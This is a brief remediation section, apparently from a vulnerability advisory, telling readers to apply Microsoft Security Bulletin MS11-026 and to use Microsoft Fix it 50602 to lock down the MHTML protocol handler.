### Solution

| **Apply an update**This issue is addressed in Microsoft Security Bulletin [MS11-026](http://www.microsoft.com/technet/security/bulletin/ms11-026.mspx). |
| --- |

| **Lock down the MHTML protocol handler**  Microsoft TechNet Security Research & Defense [blog](http://blogs.technet.com/srd/) has released Microsoft Fix it [50602](http://go.microsoft.com/?linkid=9760419) to help mitigate this vulnerability. |
